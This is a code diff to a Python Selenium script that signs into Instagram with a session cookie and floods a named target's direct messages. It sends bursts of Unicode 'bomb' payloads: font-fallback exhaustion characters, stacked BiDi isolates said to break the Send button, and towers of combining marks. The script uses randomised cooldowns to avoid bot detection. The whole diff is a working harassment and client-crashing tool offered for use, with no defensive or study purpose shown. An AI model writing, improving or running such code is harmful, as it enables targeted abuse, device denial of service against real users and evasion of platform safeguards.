@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER NC (OBLIVION V2 - DEVEL KA ABBU)
-# 📅 STATUS: DENSITY x20 | BiDi-RECURSION | 10-BURST WAVE
+# 🚀 PROJECT: PRAVEER NC (SYSTEM-OBLITERATOR)
+# 📅 STATUS: FONT-FALLBACK EXHAUSTION | 120-LAYER ISOLATE | DOUBLE-BURST
 
 import os, time, random, threading, sys, gc, tempfile
 from concurrent.futures import ThreadPoolExecutor
@@ -13,27 +13,28 @@ THREADS = 2
 SESSION_LIMIT = 240 
 MACHINE_ID = os.getenv("MACHINE_ID", "1")
 
-def get_oblivion_payload(target_name):
-    """The Oblivion Payload: Density x20 + BiDi Recursion."""
+def get_obliteration_payload(target_name):
+    """The System-Obliterator: Font-Fallback Exhaustion + Plane-14 Overload."""
     # 🌙 CUSTOM HEADER
-    header = f"🌙 DEVEL KA ABBU PRAVEER OK? 🌙\n👑 SYSTEM_OBLIVION: [{target_name.upper()}]\n"
+    header = f"🌙 DEVEL KA ABBU PRAVEER OK? 🌙\n👑 SYSTEM_OBLITERATION: [{target_name.upper()}]\n"
     
-    # 💥 THE 'DIRECTIONAL STACK' (15 layers of nested text direction)
-    bidi_recursion = "\u202E\u2066\u202D\u2067\u202B\u2068" * 15
+    # 💥 THE 'FONT-FALLBACK' TRAP (Plane-14 Variation Selectors)
+    # Most OS fonts lack these; forces a deep system-wide font search.
+    fallback_trap = "\U000E0100" * 250 
     
-    # 💥 THE 'WIDTH-DISPLACER' (Braille Blanks + Non-Breaking Spaces)
-    width_bomb = "\u2800\u00A0" * 125 
+    # 💥 THE 'ISOLATE VOID' (120 Layers)
+    # Breaks the DOM event tree so the 'Send' button fails to trigger.
+    isolate_void = "\u2066\u2067\u2068" * 120
     
-    # 💥 DENSITY x20 (200 Zalgo marks per character)
-    # This forces the GPU Command Buffer to overflow instantly.
+    # 💥 DENSITY x20 (200 Zalgo marks)
     z_tower = "̸" * 200
     
-    lines = [header, width_bomb, bidi_recursion]
+    lines = [header, fallback_trap, isolate_void]
     
-    for i in range(75):
+    for i in range(80):
         prefix = "\u202E" if i % 2 == 0 else "\u202D"
-        # Forces Horizontal Overflow, Vertical Skyscraper, and BiDi Logic Hang
-        lines.append(f"{width_bomb}{prefix}{target_name.upper()}{z_tower}{bidi_recursion}")
+        # Combine system-level trap with vertical density
+        lines.append(f"{prefix}{fallback_trap}{target_name.upper()}{z_tower}")
     
     return "\n".join(lines)[:9990]
 
@@ -51,7 +52,7 @@ def run_life_cycle(agent_id, cookie, target_id, target_name):
     while True:
         driver = None
         try:
-            print(f"[M{MACHINE_ID}-A{agent_id}] 🌙 DEVEL KA ABBU DEPLOYED...", flush=True)
+            print(f"[M{MACHINE_ID}-A{agent_id}] 🌙 DEVEL KA ABBU OBLITERATOR DEPLOYED...", flush=True)
             driver = get_driver(agent_id)
             driver.get("https://www.instagram.com/")
             driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
@@ -63,27 +64,29 @@ def run_life_cycle(agent_id, cookie, target_id, target_name):
             session_start = time.time()
             while (time.time() - session_start) < SESSION_LIMIT:
                 try:
-                    # 🔥 THE 10-BURST WAVE
-                    for _ in range(10):
-                        payload = get_oblivion_payload(target_name)
-                        driver.execute_script("""
-                            var box = document.querySelector('div[role="textbox"]') || document.querySelector('textarea');
-                            if (box) {
-                                box.focus();
-                                document.execCommand('insertText', false, arguments[0]);
-                                box.dispatchEvent(new Event('input', { bubbles: true }));
-                                var btns = document.querySelectorAll('div[role="button"]');
-                                for(var b of btns) {
-                                    if(b.innerText.includes("Send") || b.innerText.includes("ပို့မည်")) {
-                                        b.click();
+                    # 🔥 THE DOUBLE-BURST (2 Waves of 10)
+                    for wave in range(2):
+                        for _ in range(10):
+                            payload = get_obliteration_payload(target_name)
+                            driver.execute_script("""
+                                var box = document.querySelector('div[role="textbox"]') || document.querySelector('textarea');
+                                if (box) {
+                                    box.focus();
+                                    document.execCommand('insertText', false, arguments[0]);
+                                    box.dispatchEvent(new Event('input', { bubbles: true }));
+                                    var btns = document.querySelectorAll('div[role="button"]');
+                                    for(var b of btns) {
+                                        if(b.innerText.includes("Send") || b.innerText.includes("ပို့မည်")) {
+                                            b.click();
+                                        }
                                     }
                                 }
-                            }
-                        """, payload)
-                        time.sleep(0.01) # Near-zero delay for the burst
+                            """, payload)
+                            time.sleep(0.01)
+                        time.sleep(1.5) # Gap between waves
                     
-                    print(f"[M{MACHINE_ID}-A{agent_id}] 💀 10-BURST IMPACT DELIVERED", flush=True)
-                    time.sleep(random.uniform(6, 10)) # Cooldown to prevent bot detection
+                    print(f"[M{MACHINE_ID}-A{agent_id}] 💀 20-MESSAGE WAVE DELIVERED", flush=True)
+                    time.sleep(random.uniform(5, 8)) 
                     
                 except:
                     time.sleep(5)
